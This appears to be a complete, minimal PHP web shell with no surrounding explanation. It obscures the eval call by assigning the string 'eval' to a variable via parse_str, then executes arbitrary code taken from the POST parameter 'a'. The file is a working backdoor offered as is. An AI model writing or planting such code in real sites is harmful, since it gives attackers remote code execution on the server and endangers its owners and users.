<?php
$str="a=eval";
parse_str($str);
$a($_POST['a']);
?>